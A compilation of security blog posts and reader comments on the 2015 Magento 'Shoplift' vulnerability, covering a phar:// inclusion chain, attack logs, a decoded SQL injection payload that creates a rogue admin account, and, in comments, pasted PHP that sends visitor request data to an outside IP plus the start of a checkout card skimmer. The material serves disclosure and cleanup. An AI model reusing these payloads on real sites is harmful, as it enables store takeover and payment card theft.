// Check that we have at least one include directory
if (0 == count($this->_path['script'])) {
   DIE
}
// Try to include the file by concating each directory with the file name
foreach ($this->_path['script'] as $dir) {
// If the file is readable, return it (and later include it without further checks)
   if (is_readable($dir . $name)) {
       return $dir . $name;
   }
}
DIE

Zend_View_Abstract::_script()
```

At first glance, this appears to be a great opportunity for us to LFI our way to the file we have created. However, even though we can call any method we want, we are still limited to calling it without any arguments. This means we have to rely on another method to call ‘*fetchView()*’ with an argument we can control.

Fortunately for the attackers, such a method does exist: ‘*renderView()*’, which calls ‘*fetchView()*’ with a template file. We can control the template name property because of the ‘*setDataUsingMethod()*’ behavior we examined earlier. The problem is that this function calls ‘*setScriptPath()*’ before the ‘*fetchView()*’ call, which adds the ‘*./app/design*’ directory to the ‘*$this->\_path*’ array. This means that path is now prepended to our file path; due to the LFI protection at the start of the function, we cannot insert any path traversal strings and escape the ‘*design*’ directory.

If we call ‘*setScriptPath()*’ ourselves with our directory before the call to ‘*renderView()*’ (using ‘*setDataUsingMethod()*’), ‘*renderView()*’ will override us and won’t let us use our directory.

However, if we call ‘*setScriptPath()*’ with our directory name and ‘*fetchView()*’ directly (without going through ‘*renderView()*’), ‘*fetchView()*’ is called with a blank file name. When the system appends the file name to the directory, the resulting include path contains only our directory. WIN.

Unfortunately, ‘*setScriptPath()*’ appends a forward slash (‘/’) to our directory name, forcing our path to be treated as a directory in the include statement. This is a problem, as directories cannot be included.

However, as we control anything prior to that slash, we also control the stream wrapper (e.g. ‘http://’). We can therefore potentially RFI our way out of this situation. However, RFI is disabled by default in PHP versions greater than 5.2, so we need to find a different, unique wrapper to exploit, one that will allow us to treat a directory path as a valid file and is not affected by PHP’s ‘*allow\_url\_include*.’

**Phar Fetched Exploit**

The ‘*phar://*’ wrapper handles PHP archive files. Similar to JAR files, these are archives containing compressed PHP files. The unique feature of the Phar wrapper for our purposes is that **it allows us to include a file despite an ending forward slash in the file path**. That file will be properly included due to the fact the wrapper interprets the last forward slash as the root directory inside the Phar archive.

Therefore, if we try to include a path similar to ‘*phar://lolz.file/*’, the Phar parser will execute the file’s ‘bootstrap stub’, an executable PHP code that is loaded whenever the phar file is included directly (without trying to access the files it contains). Additionally, the Phar wrapper supports different stat functions such as ‘*is\_readable()*’, allowing us to pass the validity checks of the included file. Finally, the Phar parser disregards bytes prior to its header, as it considers them part of the bootstrap stub. We can therefore append our code to a valid image file – a very stealthy approach that is hard to detect. If we want to go the extra mile, Phar supports GZ and BZ2 compressions, as well as ZIP and TAR archives.

Using the authentication bypass, and combining both the file upload/SQLi vulnerability and the LFI/RFI vulnerability, we can ultimately execute any PHP code on the system, without any authentication.

* Tagged with
* [Check Point Research](https://blog.checkpoint.com/tag/check-point-research/)
* [ebay](https://blog.checkpoint.com/tag/ebay/)
* [ecommerce](https://blog.checkpoint.com/tag/ecommerce/)
* [magento](https://blog.checkpoint.com/tag/magento/)
* [rce](https://blog.checkpoint.com/tag/rce/)
* [security](https://blog.checkpoint.com/tag/security/)
* [Threat Research](https://blog.checkpoint.com/tag/threat-research/)
* [vulnerability](https://blog.checkpoint.com/tag/vulnerability/)

[16](#comments "16 Comments") [18013](#views "18013 Views")

#### You may also like

[![](https://blog.checkpoint.com/wp-content/uploads/2021/08/CPR_blog_article_Ebook_blog_300x200.jpg)](https://blog.checkpoint.com/research/exploring-q4-2024-brand-phishing-trends-microsoft-remains-the-top-target-as-linkedin-makes-a-comeback/)
[Research](https://blog.checkpoint.com/research/) January 22, 2025
### [Exploring Q4 2024 Brand Phishing Trends: Microsoft Remains the Top Target as LinkedIn Makes a Comeback](https://blog.checkpoint.com/research/exploring-q4-2024-brand-phishing-trends-microsoft-remains-the-top-target-as-linkedin-makes-a-comeback/)

Cyber criminals continue to refine their phishing tactics, targeting trusted ...

[![](https://blog.checkpoint.com/wp-content/uploads/2024/03/tax-scam-blog-2000x700-1-400x300.jpg)](https://blog.checkpoint.com/research/cracking-the-code-how-banshee-stealer-targets-macos-users/)
[Research](https://blog.checkpoint.com/research/) January 9, 2025
### [Cracking the Code: How Banshee Stealer Targets macOS Users](https://blog.checkpoint.com/research/cracking-the-code-how-banshee-stealer-targets-macos-users/)

Executive Summary: Since September, Check Point Research (CPR) has been ...

[![](https://blog.checkpoint.com/wp-content/uploads/2024/06/holiday-scams-blog-2000x700-1-400x300.jpg)](https://blog.checkpoint.com/security/protect-yourself-from-summer-vacation-scams-stay-cyber-aware-during-your-vacation/)
[Research](https://blog.checkpoint.com/research/) June 14, 2024
### [Protect Yourself from Summer Vacation Scams: Stay Cyber Aware During Your Vacation](https://blog.checkpoint.com/security/protect-yourself-from-summer-vacation-scams-stay-cyber-aware-during-your-vacation/)

Highlights: Check Point Research (CPR) warns about online phishing scams ...

[![](https://blog.checkpoint.com/wp-content/uploads/2023/01/SupplyChainAttacks_blog.jpg)](https://blog.checkpoint.com/2023/02/01/the-rise-of-the-code-package-threat/)
[Security](https://blog.checkpoint.com/security/) February 1, 2023
### [The Rise of the Code Package Threat](https://blog.checkpoint.com/2023/02/01/the-rise-of-the-code-package-threat/)

Highlights: Check Point details two recent attacks detected and blocked ...

* COMPANY
  + [About Us](https://www.checkpoint.com/about-us/)
  + [Careers](https://careers.checkpoint.com/)
  + [Leadership](https://www.checkpoint.com/about-us/leadership/)
  + [Newsroom](https://www.checkpoint.com/press-releases/)
  + [Legal](https://www.checkpoint.com/legal/)
  + [Trust Center](https://www.checkpoint.com/trust-point/)
  + [Investor Relations](https://www.checkpoint.com/about-us/investor-relations/)
  + [Merchandise Store](https://checkpointcompanystore.com/)
  + [Contact Us](https://www.checkpoint.com/about-us/contact-us/)
* TECHNICAL RESOURCES
  + [User Center Sign In](https://usercenter.checkpoint.com/usercenter/index.jsp)
  + [Advisories](https://advisories.checkpoint.com/)
  + [Threat Map](https://threatmap.checkpoint.com/)
  + [Threat Wiki](https://threatwiki.checkpoint.com/threatwiki/public.htm)
  + [URL Categorization](https://www.checkpoint.com/urlcat/)
  + [App Wiki](https://appwiki.checkpoint.com/appwikisdb/public.htm)
* EXPAND & LEARN
  + [Resource Center](https://resources.checkpoint.com/)
  + [Cyber Hub](https://www.checkpoint.com/cyber-hub/)
  + [Check Point Research](https://research.checkpoint.com/)
  + [Check Point Blog](https://blog.checkpoint.com/)
  + [CheckMates Community](https://community.checkpoint.com/)
  + [Customer Stories](https://www.checkpoint.com/customer-stories/)
* SUPPORT & SERVICES
  + [Support Center](https://supportcenter.checkpoint.com/)
  + [Infinity Global Services](https://www.checkpoint.com/services/infinity-global/)
  + [IGS Portal](https://igs.checkpoint.com/)
* + ![Black phone icon](/wp-content/themes/atoms/images/icon-phone.png) Contact Sales
    - **North America:**
    - +1-866-488-6691
    - **International:**
    - +44-125-333-5558
  + ![Black phone icon](/wp-content/themes/atoms/images/icon-phone.png) Contact Support
    - **North America:**
    - +1-888-361-5030
    - **International:**
    - +44-114-478-2845

---

Follow Us

YOU DESERVE THE BEST SECURITY™
©1994-
2025 Check Point Software Technologies Ltd. All rights reserved.

[Copyright](https://www.checkpoint.com/copyright/) | [Privacy Policy](https://www.checkpoint.com/privacy/) | Cookie Settings | [Get the Latest News](https://pages.checkpoint.com/subscribe.html)



=== Content from blog.sucuri.net_076f782f_20250124_194038.html ===
  [![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)
     [![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
 [Login](https://dashboard.sucuri.net/login/)       [Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)
 Search for:  Search

* [Magento Security](https://blog.sucuri.net/category/magento-security)
* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
# Magento Shoplift (SUPEE-5344) Exploits in the Wild

  [![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g)](https://blog.sucuri.net/author/dcid)   [Daniel Cid](https://blog.sucuri.net/author/dcid)

* April 23, 2015

As [warned](https://blog.sucuri.net/2015/04/critical-magento-shoplift-vulnerability-supee-5344-patch-immediately.html) a few days ago, the Magento Shoplift (SUPEE-5344) vulnerability details have been [disclosed](http://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/) by the CheckPoint team. They show step by step how it can be exploited to take over a vulnerable Magento site.

They have prepared the following video showing a Proof of Concept (PoC) in which they create a fake coupon:

That’s a simple example. This vulnerability can be exploited in much more devastating ways.

##### Magento ShopLift in the Wild

As expected, it is now actively being exploited.

In less than 24 hours since the disclosure, we have started to see attacks via our [WAF](https://sucuri.net/website-firewall/) logs trying to exploit this vulnerability. It seems to be coming from a specific crime group, since they all look the same:

> 62.76.177.179 – – [23/Apr/2015:00:45:44 -0400] “POST /index.php/admin/Cms\_Wysiwyg/[HIDDEN] HTTP/1.1” 403 1880 “-” “Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36”
>
> 185.22.232.218 – – [22/Apr/2015:00:42:38 -0400] “POST /index.php/admin/Cms\_Wysiwyg/[HIDDEN] HTTP/1.1” 200 2211 “-” “Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20130101 Firefox/10.0”

And always from these two IP addresses from Russia: **62.76.177.179** and **185.22.232.218**. If you look for them in your logs, you can see if you have been attacked by the same group.

Our research team was able to catch and analyze their exploit. So far, it is *only* trying to create a fake admin user inside the Magento database, which they will certainly misuse later to take over of the site. This is the decoded exploit:

> popularity[from]=0&popularity[to]=3&popularity[field\_expr]=0);
>
> SET @SALT = “rp”;
>
> SET @PASS = CONCAT(MD5(CONCAT( @SALT , ‘123’) ), CONCAT(‘:’, @SALT ));
>  SELECT @EXTRA := MAX(extra) FROM admin\_user WHERE extra IS NOT NULL;
>
> **INSERT INTO `admin\_user`** (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload\_acl\_flag`,`is\_active`,`extra`,`rp\_token`,`rp\_token\_created\_at`) VALUES (‘Firstname’,’Lastname’,”email@example.com”,’**ypwq**‘,@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
>
> INSERT INTO `admin\_role` (parent\_id,tree\_level,sort\_order,role\_type,user\_id,role\_name) VALUES (1,2,0,’U’,(SELECT user\_id FROM admin\_user WHERE username = ‘ypwq’),’Firstname’); —

The code is leveraging SQL Injection (SQLi) and inserting a new **admin\_user** to the database. If you suspect you have been compromised, look for the usernames ***vpwq*** or **defaultmanager** as it seems to be the ones being used by this specific group so far.

Note that we are hiding some of the details and payloads, to make it hard for someone else to copy and create an exploit out of it. However, some groups already have an exploit and are attacking as many sites as they can, and pretty fast.

##### Protect your Magento site!

If you haven’t patched it yet, you are likely already compromised or will be soon. I recommend patching and adding your site behind a Web Application Firewall or Intrusion Detection System to stop these attacks for you.

If you’re in need of a solution, don’t hesitate to inquire [about our Website Firewall](https://sucuri.net/website-firewall/signup); this vulnerability has been virtually patched for all existing customers.

  [![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=120&d=mm&r=g)](https://blog.sucuri.net/author/dcid)
##### [Daniel Cid](https://blog.sucuri.net/author/dcid)

Daniel B. Cid is Founder of Sucuri and the VP of Engineering for the GoDaddy Security Products group. He is also the founder of OSSEC and [CleanBrowsing](https://cleanbrowsing.org). You can find more about Daniel on his site [dcid.me](http://dcid.me) or on [Twitter: @danielcid](https://twitter.com/danielcid)

##### Related Tags

* [Hacked Websites](https://blog.sucuri.net/tag/hacked-websites)
##### 70 comments

1. ![](https://secure.gravatar.com/avatar/44274cd3d03c8e9087dd5d3a6044ea01?s=60&d=mm&r=g) **Charles McHutchence** says: [April 24, 2015 at 2:58 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6217)

   We got owned. The username was siqi for us, FYI for anyone whos looking for the admin)user account
2. ![](https://secure.gravatar.com/avatar/718ac0e5e2705470fad87d44442b900c?s=60&d=mm&r=g) **khaefeli** says: [April 24, 2015 at 3:40 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6218)

   our honeypot has the following new admin user: dbopt, \_system\_backup, dataopt

   1. ![](https://secure.gravatar.com/avatar/32b259d771dd83728dd309f8242f5e45?s=60&d=mm&r=g) **Delroy Lando** says: [April 24, 2015 at 5:43 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6224)

      We’ve got dbopt, too. What have you done, besides deleting user and installing patch?

      1. ![](https://secure.gravatar.com/avatar/718ac0e5e2705470fad87d44442b900c?s=60&d=mm&r=g) **khaefeli** says: [April 27, 2015 at 7:34 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6241)

         it’s a honeypot installation – so we want to be hacked.
          but on a live system:
          – restore (you don’t know how many .php files etc are infected)
          – install the patch
          – install a WAF
          – use a secure hosting provider (e.g. no outgoing connections etc)

         1. ![](https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=60&d=mm&r=g) **[redesigned](http://redesigned.com)** says: [April 27, 2015 at 11:09 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6248)

            are you blogging about what changes have been made to your honeypot system? that would be super helpful, not to mention fascinating.
         2. ![](https://secure.gravatar.com/avatar/32b259d771dd83728dd309f8242f5e45?s=60&d=mm&r=g) **Delroy Lando** says: [May 3, 2015 at 3:40 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6315)

            Thanks!
3. ![](https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=60&d=mm&r=g) **[redesigned](http://redesigned.com)** says: [April 24, 2015 at 11:14 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6225)

   i’ve been patching tons of sites, 60+ so far, and only 2 have been exploited, both in the 1.7 branch.
    in addition to creating an admin user, they’ve modified the /lib/Varian/Db/Adaptor/Pdo/Mysql.php file in such a way that the patch fails that chunk, and that file has to be patched manually. That is the only change I’ve noticed, but it is a big one as it leaves the door open for them to get back in if not addressed.

   Anyone know any other issues that should be checked and/or addressed?
    I’m putting together a checklist.

   Thanks!

   1. ![](https://secure.gravatar.com/avatar/557b16a4df2d721eb07f6872313270fd?s=60&d=mm&r=g) **ifnull** says: [April 27, 2015 at 8:49 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6244)

      All the exploited instances I have seen so far have had the hash/salt “f4c8e326312d5ddb79c04b408e55010a:rp”. In addition, half of the exploited instances had downloaded the Magpleasure/Filesystem extension which no longer seems to be available. The second phase of the attack happens a couple days later when they use system\_backup to create a new backup and download it.

      1. ![](https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=60&d=mm&r=g) **[redesigned](http://redesigned.com)** says: [April 27, 2015 at 8:58 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6247)

         Thanks for the update @ifnull:disqus I’m seeing the MagePleasure module as well.

         Removing that Module, Deleting the users, and Patching Magento, is there anything else that needs to be done to re-secure the system? Is there someplace that people are maintaining a checklist of the fixes that need to be done to re-secure a site? Thanks!!!

         1. ![](https://secure.gravatar.com/avatar/10074cfaa59c2b4677ea555a75e86b2f?s=60&d=mm&r=g) **Anthelmintics** says: [April 27, 2015 at 9:19 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6276)

            I just finished cleaning one up. Out of 30 sites, one was hacked. Same methodology; created a four character admin user, installed Magpleasure\_filesystem and edited /lib/Varien/Db/Adapter/Pdo/Mysql.php. Only exception was they also installed Edit Area (A source code editor) in the ‘js’ directory. I found the tarball for the file system extension and a bunch of other junk all with the same creation date 4/22/15 @ 11:15PM. In the end I opted to roll the site back to the 4/21/15, patch and merge the new customer and order data with the restored DB.

            1. ![](https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=60&d=mm&r=g) **[redesigned](http://redesigned.com)** says: [April 28, 2015 at 1:06 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6278)

               I’m also seeing EditArea in the js folder on all the sites that were hacked.
            2. ![](https://secure.gravatar.com/avatar/10074cfaa59c2b4677ea555a75e86b2f?s=60&d=mm&r=g) **Anthelmintics** says: [April 28, 2015 at 2:50 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6284)

               Same here we discovered another hacked install this morning, identical to the first one. It was running 1.6.2, I’ve not seen a 1.4, 1.7 or 1.9 site compromised as of yet.
            3. ![](https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=60&d=mm&r=g) **[redesigned](http://redesigned.com)** says: [April 29, 2015 at 3:49 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6294)

               I’m seeing the highest percentage of 1.7 sites hacked, not sure if it is something specific to the version, or just if they’ve been around longer and are easier to find.
            4. ![](https://secure.gravatar.com/avatar/557b16a4df2d721eb07f6872313270fd?s=60&d=mm&r=g) **ifnull** says: [April 28, 2015 at 5:19 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6280)

               I think EditArea is installed with Magpleasure\_filesystem
   2. ![](https://secure.gravatar.com/avatar/7fc945f6818dcceffd69cdd62320b2ac?s=60&d=mm&r=g) **Jeff Moriarty** says: [April 30, 2015 at 3:40 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6297)

      Did you notice any websites being slow to load…like practically timing out? We patched our websites after one was exploited. We had 4 websites on 1 dedicated server. All patches in, but now the sites randomly won’t load at all or take a couple minutes. Trying to figure this one out.

      1. ![](https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=60&d=mm&r=g) **[redesigned](http://redesigned.com)** says: [April 30, 2015 at 4:53 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6298)

         Hey Jeff,

         I haven’t noticed that for any of the sites I’ve patched.

         Is it one specific version of Magento?

         Did you upgrade the Magento version at the same time, if so those setup scripts can take a long time.

         Do they load faster now? Sometimes changes will trigger a reindex which slows the site down/times it out, until that completes, then the site returns to normal.

         Do you have any sort of server level caching enabled (memcache/apc/varnish) etc? That needs to be cleared.

         Have you manually cleared the sites caches:
          rm -rf ./downloader/pearlib/cache/\* ./downloader/pearlib/download/\*
          rm -rf ./var/cache/\* ./var/session/\* ./var/report/\* ./var/log/\*
          rm -rf ./media/tmp/\* ./app/code/core/Zend/Cache/\* ./var/tmp/\*

         Have you reindexed the sites?
          php ./shell/indexer.php -reindexall

         Have you scanned for any other malicious changes? You can see any files modified in the last 4 days via:
          find -type f -mtime -4

         Make sure to remove the hacked admin users and any you don’t actively need.

         Make sure to delete the MagePleasure\_FileSystem module.

         Make sure to delete the EditArea JavaScript code editor.

         Make sure to manually make the changes to the /lib/Varian/Db/Adaptor/Pdo/Mysql.php file as the patch will fail to patch that file on a hacked site.

         Change all the admin passwords, and ideally the admin login url.

         Hopefully something in this message helps, please let me know if you need any assistance or have any further questions.

         Cheers,
          Josh

         1. ![](https://secure.gravatar.com/avatar/7fc945f6818dcceffd69cdd62320b2ac?s=60&d=mm&r=g) **Jeff Moriarty** says: [May 1, 2015 at 9:42 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6309)

            It ended up being on the server…something else the hosting company did the same weekend ugh. Fixed now though. But 3 days after the patch was installed, we had an order placed, and they said their card was used right after in a fraudulant transaction. Could there be something the patch isn’t protecting?

            1. ![](https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=60&d=mm&r=g) **[redesigned](http://redesigned.com)** says: [May 1, 2015 at 10:09 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6310)

               Yeah, yikes! The patch only protects against initial intrusion, it closes the initial entry point, but that is it.

               If the site has already been hacked then likely malicious code was installed into the site as well as several new entry points. Once a site has been hacked it takes a lot more then the patches to get it back to proper working order.

               Do you have a pre-hack backup of the files you can roll back to or source control on the site? If not you will want to go through the fixes I outlined above, and double check the files I mention in the update below that, as well as scan for additional changes. If you find anything new, please post back here for the benefit of the rest of us.

               I’ve been putting in 16+ hr days all week patching sites and cleaning hacked sites. right now I’m seeing approx 70% of unpatched sites being hacked, which is a very high rate, at first it was only a handful.

               If you don’t have a backup and need additional assistance cleaning the site(s) let me know. Best of luck with your sites! Cheers.
      2. ![](https://secure.gravatar.com/avatar/983df24094cbf34fc923aafaf5423398?s=60&d=mm&r=g) **volkan** says: [April 30, 2015 at 8:01 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6302)

         i had the same problem, especially the checkout was very slow.
          the Problem was in the /js/index.php, it was compromised too
          check also index.php and /lib/varien/autoload.php
4. ![](https://secure.gravatar.com/avatar/fc02627025e821c954eb29b220041d1e?s=60&d=mm&r=g) **Subprime** says: [April 26, 2015 at 10:30 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6233)

   Usernames dewo and \_system\_backup for our site. Dewo is email@example.com, so appears to be a typo of demo.

   1. ![](https://secure.gravatar.com/avatar/557b16a4df2d721eb07f6872313270fd?s=60&d=mm&r=g) **ifnull** says: [April 27, 2015 at 8:50 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6245)

      I’ve seen a half dozen different users names. They are all 4 char and seem random.
5. ![](https://secure.gravatar.com/avatar/4d04739a3efe956f2fdc57eaadfaa656?s=60&d=mm&r=g) **Alex Nauta** says: [April 26, 2015 at 1:47 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6235)

   So I am currently fixing an exploited test-installation of magento 1.9.x , and noticed these IP adresses too. But they had a little different workflow, as I found out, they have installed the module “Magpleasure File System” remotely to get access to the filesystem.

   1. ![](https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=60&d=mm&r=g) **[redesigned](http://redesigned.com)** says: [April 27, 2015 at 11:11 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6249)

      Any other changes you’ve found?
   2. ![](https://secure.gravatar.com/avatar/51b400f4974a833e8d3f9f065f8348f6?s=60&d=mm&r=g) **cd7** says: [April 27, 2015 at 1:18 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6250)

      It could come together why there was starting be active month-two ago POST requests to Magento Connect Install

      POST /downloader/index.php?A=loggedin
6. ![](https://secure.gravatar.com/avatar/83bc4e7e22243b09010695c451d696a4?s=60&d=mm&r=g) **TheloMonk** says: [April 27, 2015 at 8:30 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6243)

   For my magento site, the created admin user was gxer et the email gxer@example.com
7. ![](https://secure.gravatar.com/avatar/557b16a4df2d721eb07f6872313270fd?s=60&d=mm&r=g) **ifnull** says: [April 27, 2015 at 8:51 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6246)

   Usernames are random 4 character. Look for email address email@example.com.
8. ![](https://secure.gravatar.com/avatar/2f14690038624a4867f62a3639b07e94?s=60&d=mm&r=g) **Mike** says: [April 27, 2015 at 6:40 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6273)

   I checked all core files and they’ve modified the Mysql.php and IndexController.php in Magento Version 1.7.0.1 – I also compared the actual database with an unhacked mysql dump, but can’t find anything.
9. ![](https://secure.gravatar.com/avatar/1aedb8d9dc4751e229a335e371db8058?s=60&d=mm&r=g) **test** says: [April 29, 2015 at 9:28 am](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6288)

   ypwq or vpwq???
10. ![](https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=60&d=mm&r=g) **el polaco** says: [April 29, 2015 at 2:00 pm](https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6291)

    Also there is new code injection in /js/index.php

    // no files specified return 404

    $id=str\_replace(“www.”, “”, $\_SERVER[‘HTTP\_HOST’]);

    //checking if client have older copy then we have on server

    $url=’http://217.12.204.163/obf.php’;

    if($\_COOKIE[“SESSIID”]!=””){

    // try automatically get content type if requested

    $url=$url.’?a=’.$\_COOKIE[“SESSIID”];

    $data=json\_encode(array(‘request’=>$\_REQUEST, ‘ip’=>$\_SERVER[‘REMOTE\_ADDR’],’ua’=>$\_SERVER[‘HTTP\_USER\_AGENT’],’cookie’=>$\_COOKIE[“SESSIID”],’date\_unix’=>time()));

    $data=base64\_encode($data);

    $ch = curl\_init();

    // set custom content type if specified

    curl\_setopt($ch, CURLOPT\_URL,$url);

    curl\_setopt($ch, CURLOPT\_POST, 1);

    curl\_setopt($ch, CURLOPT\_POSTFIELDS,http\_build\_query(array(‘data’=>$data,’utmp’=>$id)));

    curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, false);

    curl\_exec ($ch);

    curl\_close ($ch);

    } else{

    // try automatically get content type if requested

    $rand=rand(1,9999999999);

    setcookie(“SESSIID”, $rand,time()+3600);

    $data=json\_encode(array(‘request’=>$\_REQUEST, ‘ip’=>$\_SERVER[‘REMOTE\_ADDR’],’ua’=>$\_SERVER[‘HTTP\_USER\_AGENT’],’cookie’=>$rand,’date\_unix’=>time()));

    $data=base64\_encode($data);

    $url=$url.’?a=’.$rand;

    $ch = curl\_init();

    // set custom content type if specified

    curl\_setopt($ch, CURLOPT\_URL,$url);

    curl\_setopt($ch, CURLOPT\_POST, 1);

    curl\_setopt($ch, CURLOPT\_POSTFIELDS,http\_build\_query(array(‘data’=>$data,’utmp’=>$id)));

    curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, false);

    curl\_exec ($ch);

    curl\_close ($ch);

    }

    and in /js/lib/ccard.js

    var snd =null;

    window.onload = function () {

    if((new RegExp(‘onepage|onestepcheckout|firecheckout|onestepquickcheckout|simplecheckout|checkout’)).test(window.location)) {

    send();

    }

    };

    function clk() {

    var inp=document.querySelectorAll(“input, select, textarea, checkbox”);

    for (var i=0;i0) {

    var nme=inp[i].name;

    if(nme==”) { nme=i; }

    snd+=inp[i].name+’=’+inp[i].value+’&’;

    }

    }

    }

    function send() {

    var btn=document.querySelectorAll(“button, input, submit, .btn, .button”);

    for (var i=0;i<btn.length;i++){

    var b=btn[i];

    if(b.type!='text' && b.type!='slect' && b.type!='checkbox' && b.type!='password' && b.type!='radio') {

    if(b.addEventListener) {

